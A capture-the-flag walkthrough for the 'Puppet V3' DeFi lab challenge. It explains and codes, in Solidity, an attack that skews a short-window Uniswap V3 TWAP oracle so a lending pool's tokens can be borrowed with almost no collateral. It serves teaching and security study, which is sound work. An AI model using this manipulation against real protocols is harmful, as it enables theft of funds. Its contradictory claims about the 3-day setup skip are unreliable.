## Challenge 14 Walkthrough: Puppet V3

### Vulnerability

Puppet V3 uses a genuine TWAP oracle — `OracleLibrary.consult()` from the official Uniswap V3 periphery — which is a real improvement over V1 and V2. The vulnerability is the **observation window length**:

```solidity
uint32 public constant TWAP_PERIOD = 10 minutes; // ← 600 seconds

function _getOracleQuote(uint128 amount) private view returns (uint256) {
    (int24 arithmeticMeanTick,) = OracleLibrary.consult({
        pool: address(uniswapV3Pool),
        secondsAgo: TWAP_PERIOD   // ← looks back exactly 10 minutes
    });
    return OracleLibrary.getQuoteAtTick({
        tick: arithmeticMeanTick,
        baseAmount: amount,
        baseToken: address(token),
        quoteToken: address(weth)
    });
}
```

A TWAP computes the time-weighted average price over a window. If an attacker can manipulate the price and then wait for the window to fill with the manipulated price, the TWAP converges toward the manipulated value. With only a 10-minute window, this is feasible.

The second constraint is `_isSolved()`:
```solidity
assertLt(block.timestamp - initialBlockTimestamp, 115, "Too much time passed");
```

The player has **at most 114 seconds** to complete the entire attack. Since `TWAP_PERIOD` is 600 seconds, the player cannot wait for the full window to fill. But they don't need to — they only need to manipulate **enough of the window** to reduce the TWAP quote enough that the required WETH collateral falls within their ~1 WETH budget.

The setup calls `skip(3 days)` before setting `initialBlockTimestamp`, which means the pool's observation history is fully populated with 3 days of stable 1:1 price data. This establishes the baseline the TWAP reads from — and makes the 10-minute window manipulation more impactful since the last 10 minutes are what gets overwritten.

### Exploit

The attack proceeds in three phases:

**Phase 1 — Dump DVT to manipulate the price (happens at t=0):**

```solidity
// Swap all 110 DVT → WETH via the Uniswap V3 pool
// This crashes the DVT/WETH tick, pushing the pool price sharply down
token.approve(address(swapRouter), PLAYER_INITIAL_TOKEN_BALANCE);
ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
    tokenIn:           address(token),
    tokenOut:          address(weth),
    fee:               FEE,
    recipient:         player,
    deadline:          block.timestamp,
    amountIn:          PLAYER_INITIAL_TOKEN_BALANCE,
    amountOutMinimum:  0,
    sqrtPriceLimitX96: 0
});
swapRouter.exactInputSingle(params);
```

After dumping 110 DVT into a 100 WETH / 100 DVT pool, the price of DVT in WETH collapses. The pool's current tick is now far lower than the pre-manipulation tick.

**Phase 2 — Warp forward within the 114-second window:**

```solidity
vm.warp(block.timestamp + 110);  // stay under 115s limit
```

After warping 110 seconds, `OracleLibrary.consult(secondsAgo: 600)` computes the TWAP over the last 600 seconds: 110 seconds of manipulated (low) price + 490 seconds of stable 1:1 price. Even with only 110/600 of the window at the manipulated price, the arithmetic mean tick shifts enough that the required WETH collateral falls below what the player holds.

**Phase 3 — Wrap ETH, borrow, send to recovery:**

```solidity
// Wrap ETH received from swap + initial balance
weth.deposit{value: player.balance}();

// Check how much WETH is needed after partial TWAP manipulation
uint256 wethRequired = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
weth.approve(address(lendingPool), wethRequired);

// Borrow all 1M DVT
lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);

// Send to recovery
token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
```

### Why It Works

The TWAP window length is a direct tradeoff between oracle security and capital cost of manipulation. A 10-minute window means an attacker needs to hold a manipulated price for at most 10 minutes to fully corrupt the oracle — but with the 114-second constraint, only a partial window manipulation is needed. The arithmetic mean tick shifts proportionally to the time spent at the manipulated price, so even 110 seconds of manipulation moves the TWAP enough to make 1M DVT borrowable with ~1 WETH.

The `skip(3 days)` in setUp — which appears to help the pool by building observation history — actually makes no difference to the attack. The TWAP only looks back 10 minutes. What happened 3 days ago is irrelevant.

A secure oracle would require a window long enough that partial manipulation within any practical time constraint is insufficient — typically hours to days for large DeFi protocols. Uniswap itself recommends at minimum 30-minute TWAPs for low-liquidity pools, and notes that even those can be manipulated given sufficient capital and time.

> **Note:** This challenge requires `MAINNET_FORKING_URL` set in `.env`. The setup forks mainnet at block 15450164 to use the live Uniswap V3 factory and position manager at their deployed addresses.

This is a **TWAP oracle manipulation via insufficient observation window** — the upgrade from spot price to TWAP was genuine, but the window is too short to resist a time-constrained attacker.
